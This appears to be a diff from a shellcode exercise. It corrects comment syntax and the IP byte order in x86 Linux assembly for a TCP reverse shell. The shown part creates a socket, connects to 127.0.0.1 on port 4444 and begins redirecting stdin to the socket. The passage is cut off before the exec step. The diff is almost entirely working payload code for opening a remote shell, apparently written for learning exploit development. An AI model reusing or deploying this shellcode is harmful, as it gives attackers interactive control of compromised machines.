@@ -3,34 +3,34 @@ global _start
 section .text
 _start:
 
-  # Socket()
-mov eax, 102 #socket syscall #
-mov ebx, 1 #socket subfunction #
+  ; Socket()
+mov eax, 102 ;socket syscall #
+mov ebx, 1 ;socket subfunction #
 push 0
 push 1
-push 2 # same arguments as the tcp bind assembly
+push 2 ; same arguments as the tcp bind assembly
 
-mov ecx, esp # put stack pointer in ecx
+mov ecx, esp ; put stack pointer in ecx
 
-int 0x80 #interrupt
+int 0x80 ;interrupt
 
-mov edi, eax # saving file descriptor (return value)
+mov edi, eax ; saving file descriptor (return value)
 
-# Connect()
-mov eax, 102 # socket syscall again
-mov ebx, 3 # subfunction number for 'connect'
-push dword 7F000001 # IP address 127.0.0.1
-push word 0x5C11 # port 4444
-push word 2 # AF_INET
+; Connect()
+mov eax, 102 ; socket syscall again
+mov ebx, 3 ; subfunction number for 'connect'
+push dword 0x0100007F ; IP address 127.0.0.1
+push word 0x5C11 ; port 4444
+push word 2 ; AF_INET
 mov ecx, esp
 
-push 16 # addrlen
-push ecx # sockaddr struct
-push edi # sockfd (file descriptor, return value from socket())
+push 16 ; addrlen
+push ecx ; sockaddr struct
+push edi ; sockfd (file descriptor, return value from socket())
 
-mov ecx, esp # stack pointer into ecx
+mov ecx, esp ; stack pointer into ecx
 
-int 0x80 # interrupt
+int 0x80 ; interrupt
 
 mov ebx, eax ; file descriptor into ebx because its the first arg  
 mov ecx, 0; stdin  
